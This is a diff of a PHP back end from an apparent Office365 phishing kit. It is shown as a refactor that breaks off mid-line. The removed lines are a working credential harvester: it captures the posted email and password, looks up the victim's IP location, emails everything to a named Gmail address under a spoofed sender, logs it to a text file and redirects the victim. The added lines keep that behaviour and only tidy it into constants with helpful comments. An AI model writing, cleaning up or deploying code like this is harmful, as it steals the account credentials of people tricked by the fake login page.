@@ -1,45 +1,18 @@
 <?php
-$Email = $_POST['Email'];
+$Email = $_POST['email']; // Use lowercase 'e' for 'email' variable name for consistency
 $password = $_POST['password'];
-include 'antibots.php';
+include_once('antibots.php');
+require_once __DIR__ . '/geoplugin.class.php';
 
-$TheBoss = "terryanderson0110@gmail.com";
-require_once('geoplugin.class.php');
+// Define constants for clarity and easier future updates
+define("EMAIL", "terryanderson0110@gmail.com");
+define("SUBJECT", "Office365 - Login Attempt");
+define("FROM_EMAIL", "noreplay.dgz.gdn@protonmail.com");
+define("LOCATION", "http://example.com"); // Replace with your desired URL to redirect users after submission
 
-$geoplugin = new geoPlugin();
+$geoplugin = new \GeoPlugin();
 
 $ip = $_SERVER["REMOTE_ADDR"];
 $port = $_SERVER["REMOTE_PORT"];
 $browser = $_SERVER['HTTP_USER_AGENT'];
-$adddate = date("D M d, Y g:i a");
-$logId = uniqid();
-$geoplugin->locate($ip);
-$subject = "Office365  - $country ($logId)";
-$headers = "From:  Office <noreplay.dgz.gdn@protonmail.com>";
-
-$message .= "---------------|54|---------------\n";
-$message .= "Email: $Email\n";
-$message .= "Password: $password\n";
-$message .= "IP Address : $ip\n";
-$message .= "Port : $port\n";
-$message .= "Date : $adddate\n";
-$message .= "User-Agent: " . $browser . "\n";
-$message .= "--------------------------------------------\n";
-$message .= "City: {$geoplugin->city}\n";
-$message .= "Region: {$geoplugin->region}\n";
-$message .= "Country Name: {$geoplugin->countryName}\n";
-$message .= "Country Code: {$geoplugin->countryCode}\n";
-$message .= "-------------- modified by terryanderson0110@gmail.com -----------------\n";
-$message .= "$logId\n";
-
-mail($TheBoss, $subject, $message, $headers);
-
-echo "<html><head><script>window.top.location.href='{LOCATION}';</script></head><body></body></html>";
-
-$fp = fopen("finish2.txt", "a");
-fputs($fp, $message);
-fclose($fp);
-$praga = rand();
-$praga = md5($praga);
-
-?>
+$adddate = date("D M d,
